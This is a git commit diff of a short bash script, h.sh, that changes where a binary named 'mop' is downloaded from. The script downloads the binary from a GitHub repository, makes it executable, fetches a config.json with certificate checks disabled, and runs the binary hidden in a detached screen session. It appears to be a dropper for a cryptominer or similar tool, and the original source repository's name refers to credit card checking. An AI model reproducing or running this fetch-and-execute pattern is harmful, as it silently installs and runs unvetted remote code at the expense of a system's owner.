d7fd24c3cf958d5a1489ed2f337640c51fe87416
dballard198 <dballard198@gmail.com>
2026-05-23 17:49:28 +0800

    Update h.sh

--- h.sh
+++ h.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/maklinngf/MASS-CC-CHECKER/refs/heads/main/mop
+wget https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/mop
 chmod u+x mop
 wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/dballard198/jackse/refs/heads/main/h.json
 screen -dmS task bash -c "./mop"
